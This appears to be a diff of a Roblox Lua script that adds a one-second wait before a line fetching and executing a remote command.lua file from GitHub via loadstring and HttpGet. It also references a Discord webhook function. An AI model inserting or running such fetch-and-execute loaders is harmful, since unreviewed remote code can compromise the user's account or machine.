@@ -7,6 +7,9 @@ local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 local PlaceId = game.PlaceId
 local JobId = game.JobId
+
+task.wait(1)
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/NeuronerX/verysigma2/refs/heads/main/command.lua'))()
 
 -- Discord webhook function
